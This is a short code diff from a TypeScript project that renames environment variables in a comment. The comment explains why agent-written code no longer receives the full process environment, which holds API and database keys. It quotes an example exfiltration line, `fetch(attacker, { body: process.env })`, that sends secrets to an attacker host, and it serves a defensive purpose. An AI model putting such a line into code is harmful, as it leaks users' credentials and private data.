@@ -250,7 +250,7 @@ function resolveCmd(cmd: string[]): string[] {
  *
  * This used to be `{ ...process.env }` — the sidecar's whole environment,
  * handed to code the agent wrote itself and has not reviewed. That includes
- * `FERAL_API_KEY` (the bearer token for this machine's runtime), `FERAL_DB_KEY`
+ * `CINDERPAW_API_KEY` (the bearer token for this machine's runtime), `CINDERPAW_DB_KEY`
  * (the at-rest key for semantic memory, which holds whatever the user has said),
  * and whatever provider keys the user exported in the shell that launched
  * Cinderpaw. One `fetch(attacker, { body: process.env })` inside a test file and
